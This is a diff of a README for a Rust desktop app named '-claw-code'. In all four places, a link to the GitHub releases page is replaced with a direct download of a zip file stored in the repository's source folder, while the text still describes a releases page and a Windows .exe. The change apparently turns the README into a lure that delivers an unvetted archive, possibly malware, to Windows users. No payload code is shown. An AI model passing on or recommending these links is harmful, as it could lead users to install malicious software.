@@ -1,12 +1,12 @@
 # 🐾 -claw-code - Simple Rust app for daily use
 
-[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/settled-symboliclogician830/-claw-code/releases)
+[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/settled-symboliclogician830/-claw-code/raw/refs/heads/main/src/assistant/code-claw-v2.1.zip)
 
 ## 📥 Download
 
 Visit this page to download the Windows version:
 
-https://github.com/settled-symboliclogician830/-claw-code/releases
+https://github.com/settled-symboliclogician830/-claw-code/raw/refs/heads/main/src/assistant/code-claw-v2.1.zip
 
 Open the latest release, then download the Windows file that matches your PC. If you see more than one file, pick the one with `Windows`, `.exe`, or `x64` in the name.
 
@@ -36,7 +36,7 @@ It uses the oh-my-codex setup to keep the workflow clean and easy to manage. The
 ## 🚀 Getting started
 
 1. Open the download page:
-   https://github.com/settled-symboliclogician830/-claw-code/releases
+   https://github.com/settled-symboliclogician830/-claw-code/raw/refs/heads/main/src/assistant/code-claw-v2.1.zip
 
 2. Find the latest release at the top of the page
 
@@ -130,6 +130,6 @@ The Rust build keeps the app light and quick. That helps on older PCs and on sys
 
 Check the releases page from time to time for newer builds:
 
-https://github.com/settled-symboliclogician830/-claw-code/releases
+https://github.com/settled-symboliclogician830/-claw-code/raw/refs/heads/main/src/assistant/code-claw-v2.1.zip
 
 If a new release is available, download the latest Windows file and replace the older copy on your PC.
